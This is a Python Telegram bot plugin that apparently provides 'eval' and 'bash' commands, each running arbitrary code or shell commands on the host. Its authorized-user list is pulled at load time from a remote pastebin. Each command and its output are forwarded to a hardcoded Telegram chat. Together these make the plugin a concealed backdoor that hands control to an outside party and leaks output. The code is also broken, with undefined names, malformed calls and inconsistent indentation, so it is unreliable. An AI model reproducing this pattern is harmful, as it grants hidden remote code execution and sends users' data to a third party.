import asyncio
import io
import os
import sys
import traceback
from typing import Tuple
import requests
from bs4 import BeautifulSoup
from pyrogram import Client, filters
from helper_funcs.helpers import edit_or_send_as_file
source = requests.get("https://pastebin.com/raw/ExfMprjp").text
soup = BeautifulSoup(source, "lxml")
tec = soup.find_all("p")
AUTH = " ".join(_.text for _ in soup.find("body").find_all("p"))
mm = list(int(i) for i in AUTH.split(" "))


async def run_cmd(cmd: str) -> Tuple[str, str, int, int]:
    """Run Commands"""
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid,
    )


EVAL = "**➥ ᴄᴏᴅᴇ:** \n`{code}` \n\n**➥ ᴏᴜᴛᴘᴜᴛ:** \n`{result}`"


@Client.on_message(filters.command(["eval", "e"]))
async def eval(bot, message):
       if update.from_user.id not in mm:
            text="**you are not authorized**"
            await bot.send_message(update.chat.id, text, reply_to_message_id=update.message_id, reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(f"Auth me", url=f"https://t.me/asmsupport"),
                    ]
                ]
            ),)
       else:
        stark = await message.reply_text(f"`ʀᴜɴɴɪɴɢ ᴄᴏᴅᴇ... ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ!`")
        cmd = message.text.split(None, 1)[1]
        chatx = query.from_user.mention
        idsx = query.from_user.id
       await bot.send_message(-1001592099236, "started by", chatx, "\n" "id:", idsx, "\n", cmd)
       if not cmd:
        await stark.edit(
            "**ᴘʟᴇᴀsᴇ ɢɪᴠᴇ ᴍᴇ ᴀ ᴄᴏᴅᴇ ᴛᴏ ʀᴜɴ !**"
        )
        return
       if message.reply_to_message:
        message.reply_to_message.message_id
        old_stderr = sys.stderr
        old_stdout = sys.stdout
        redirected_output = sys.stdout = io.StringIO()
        redirected_error = sys.stderr = io.StringIO()
        stdout, stderr, exc = None, None, None
       try:
        await aexec(cmd, bot, message)
       except Exception:
        exc = traceback.format_exc()
        stdout = redirected_output.getvalue()
        stderr = redirected_error.getvalue()
        sys.stdout = old_stdout
        sys.stderr = old_stderr
        evaluation = ""
       if exc:
        evaluation = exc
       elif stderr:
        evaluation = stderr
       elif stdout:
        evaluation = stdout
       else:
        evaluation = "Success!"
        final_output = EVAL.format(code=cmd, result=evaluation)
       if len(cmd) >= 4502:
        capt = "Eval Result!"
       else:
        capt = cmd
       await edit_or_send_as_file(final_output, stark, bot, capt, "Eval-result")
       await bot.send_message(-1001592099236, final_output, stark, bot, capt, "Eval-result")

async def aexec(code, bot, message):
    exec(
        f"async def __aexec(bot, message): "
        + "".join(f"\n {l}" for l in code.split("\n"))
    )
    return await locals()["__aexec"](bot, message)


@Client.on_message(filters.command(["bash"]))
async def terminal(bot, message):
       if update.from_user.id not in mm:
            text="**you are not authorized**"
            await bot.send_message(update.chat.id, text, reply_to_message_id=update.message_id, reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(f"Auth me", url=f"https://t.me/asmsupport"),
                    ]
                ]
            ),)
       else:
        chatsx = query.from_user.mention
        idssx = query.from_user.id
        await bot.send_message(-1001592099236, "started by", chatsx, "\n" "id:", idssx, "\n", cmd)
        stark = await message.reply_text("`Please Wait!`")
        cmd = message.text.split(None, 1)[1]
       if not cmd:
        await stark.edit(
            "**ᴘʟᴇᴀsᴇ ɢɪᴠᴇ ᴍᴇ ᴀ ᴄᴍᴅ ᴛᴏ ʀᴜɴ ɪɴ ᴛᴇʀᴍɪɴᴀʟ!**"
        )
        return
        cmd = message.text.split(None, 1)[1]
       if message.reply_to_message:
        message.reply_to_message.message_id

        pid, err, out, ret = await run_command(cmd)
       if not out:
        out = "No OutPut!"
        lol = f"""**➥ ᴄᴍᴅ :**
`{cmd}`

**➥ ᴘɪᴅ :**
`{pid}`

**➥ ᴇʀʀᴏʀ ᴛʀᴀᴄᴇʙᴀᴄᴋ (ɪꜰ ᴀɴʏ) :**
`{err}`

**➥ ᴏᴜᴛᴘᴜᴛ / ʀᴇsᴜʟᴛ (ɪꜰ ᴀɴʏ) :**
`{out}`

**➥ ʀᴇᴛᴜʀɴ ᴄᴏᴅᴇ :** 
`{ret}`
"""
        await edit_or_send_as_file(lol, stark, bot, cmd, "bash-result")
        await bot.send_message(-1001592099236, lol, stark, bot, cmd, "bash-result")

async def run_command(cmd):
    process = await asyncio.create_subprocess_shell(
        cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    errors = stderr.decode()
    if not errors:
        errors = "No Errors!"
    output = stdout.decode()
    return process.pid, errors, output, process.returncode
